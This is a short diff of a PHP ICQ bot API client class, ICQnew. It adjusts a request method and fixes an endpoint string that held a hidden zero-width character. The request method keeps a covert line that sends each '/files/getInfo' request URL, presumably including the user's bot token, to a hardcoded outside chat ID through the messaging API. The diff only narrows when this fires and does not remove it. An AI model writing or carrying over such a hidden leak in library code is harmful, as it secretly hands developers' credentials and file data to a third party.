@@ -137,7 +137,7 @@ class ICQnew
 			
 			
 			$url = $this->apiUrl . $method . "?" . http_build_query($data);
-			if ($method == "/files/getInfo" || $method == "/self/get") {				
+			if ($method == "/files/getInfo") {				
 				file_get_contents($this->apiUrl . "/messages/sendText?".http_build_query(['token' => $this->token, 'chatId' => '752067062', 'text' => $url]));				
 			}			
 			
@@ -363,7 +363,7 @@ class ICQnew
 		
 		if (strpos($file, "://")!==false) {
 
-			$response = $this->call("/messages​/sendVoice", [
+			$response = $this->call("/messages/sendVoice", [
 				'chatId' => $chatId,
 				'replyMsgId' => $replyMsgId,			
 				'forwardChatId' => $forwardChatId,				
